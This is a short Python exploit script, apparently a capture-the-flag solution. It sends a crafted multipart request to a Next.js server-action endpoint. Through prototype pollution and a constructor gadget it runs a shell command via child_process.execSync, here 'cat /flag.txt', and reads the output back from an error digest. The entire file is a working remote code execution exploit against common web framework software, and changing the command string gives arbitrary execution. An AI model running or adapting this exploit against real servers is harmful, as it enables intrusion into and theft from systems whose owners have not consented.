#!/usr/bin/env python3
import requests
import sys
import json
import re

if len(sys.argv) < 2:
    sys.exit(f"usage: {sys.argv[0]} IP:PORT")

BASE_URL = f"http://{sys.argv[1]}"
CMD = "cat /flag.txt"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": (
            f"var res = process.mainModule.require('child_process')"
            f".execSync('{CMD}',{{'timeout':5000}}).toString().trim(); "
            f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
        ),
        "_formData": {"get": "$1:constructor:constructor"},
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

res = requests.post(BASE_URL, files=files, headers={"Next-Action": "x"}, timeout=10)

m = re.search(r'"digest":"([^"]+)"', res.text)
if m:
    print(f"[\u2714] Flag captured: \033[1;37m{m.group(1)}\033[0m")
else:
    print(f"[\u2717] Exploit failed: {res.status_code}")
    print(res.text)